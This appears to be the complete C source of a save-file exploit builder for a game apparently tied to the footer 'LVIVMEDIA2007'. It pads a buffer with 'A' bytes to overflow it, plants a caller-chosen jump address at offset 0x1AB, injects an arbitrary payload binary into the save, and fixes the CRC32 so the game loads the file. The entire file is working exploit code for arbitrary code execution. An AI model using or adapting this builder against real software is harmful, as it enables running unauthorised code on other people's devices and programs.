#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef int8_t   i8;
typedef uint8_t  u8;
typedef int16_t  i16;
typedef uint16_t u16;
typedef int32_t  i32;
typedef uint32_t u32;
typedef int64_t  i64;
typedef uint64_t u64;
typedef float    r32;
typedef double   r64;
typedef i32      b32;


static u8 SaveBuffer[0x80000];
static u8 PayloadBuffer[0x80000];
static u32 PayloadBufferSize;

// CRC calc code from 
// http://www.geocities.ws/malbrain/crc_c.html

static unsigned long Crc32[] =
{
    0x00000000, 0x1db71064, 0x3b6e20c8, 0x26d930ac,
    0x76dc4190, 0x6b6b51f4, 0x4db26158, 0x5005713c,
    0xedb88320, 0xf00f9344, 0xd6d6a3e8, 0xcb61b38c,
    0x9b64c2b0, 0x86d3d2d4, 0xa00ae278, 0xbdbdf21c
};

static unsigned long
crc32_calc(unsigned char *ptr, unsigned cnt, unsigned long crc)
{
    while( cnt-- )
    {
        crc = ( crc >> 4 ) ^ Crc32[(crc & 0xf) ^ (*ptr & 0xf)];
        crc = ( crc >> 4 ) ^ Crc32[(crc & 0xf) ^ (*ptr++ >> 4)];
    }

    return crc;
}

static b32
BuildSave(u32 PayloadAddress, u32 PayloadOffset)
{
    b32 Success = 0;

    if (PayloadOffset > 0x1AF)
    {
        if ((PayloadOffset + PayloadBufferSize) <= 0x914)
        {
            // Data here should already be zero, but I no trust
            memset(SaveBuffer, 0, sizeof(SaveBuffer));

            // I don't know what this is, its a number of some sorts
            *(u32 *)(SaveBuffer) = 0x00FF6600;

            // Player name
            memcpy(SaveBuffer + 4, "EXPLOIT", 7);

            // Says how many strings are in the table of properties in the save
            SaveBuffer[0x55] = 0x14;

            // Dunno
            SaveBuffer[0x58] = 1;
            SaveBuffer[0x64] = 3;

            // Buffer overflow data
            memset(SaveBuffer + 0x68, 'A', 0x143);

            // Jump address
            *(u32 *)(SaveBuffer + 0x1AB) = PayloadAddress;

            // Footer
            memcpy(SaveBuffer + 0x914, "LVIVMEDIA2007_MAX_GEN_SAS_YAR&Co", 0x20);

            // Unused
            memset(SaveBuffer + 0xA33, 0xFF, 0x7F5CD);

            for (u32 i = 0; i < PayloadBufferSize; ++i)
            {
                u32 Offset = PayloadOffset + i;
                if (Offset == 0x4DD || Offset == 0x721)
                {
                    printf("Warning: Copied over a size var, this may or may not be bad\n");
                }
                SaveBuffer[Offset] = PayloadBuffer[i];
            }

            *(u32 *)(SaveBuffer + 0x934) = (u32)~crc32_calc(SaveBuffer, 0x934, (unsigned long)~0);

            Success = 1;
        }
        else
        {
            printf("Error: Payload may be too big. It will overlap the save footer\n");
            Success = 0;
        }
    }
    else
    {
        printf("Error: Payload offset must be after 0x1AF\n");
        Success = 0;
    }

    return Success;
}

int
main(int argc, char **argv)
{
    int Result = 1;
    if (argc >= 5)
    {
        FILE *OutFile = fopen(argv[1], "wb");
        FILE *Payload = fopen(argv[2], "rb");
        u32 PayloadAddress = strtoul(argv[3], 0, 0);
        u32 PayloadOffset = strtoul(argv[4], 0, 0);

        if (OutFile && Payload)
        {
            PayloadBufferSize = (u32)fread(PayloadBuffer, 1, sizeof(PayloadBuffer), Payload);
            fclose(Payload);
            if (BuildSave(PayloadAddress, PayloadOffset))
            {
                fwrite(SaveBuffer, 1, sizeof(SaveBuffer), OutFile);
                fflush(OutFile);
                fclose(OutFile);
                Result = 0;
            }
            else
            {
                Result = 1;
            }
        }
        else
        {
            printf("Error: Unable to open files\n");
            Result = 1;
        }
    }

    return Result;
}

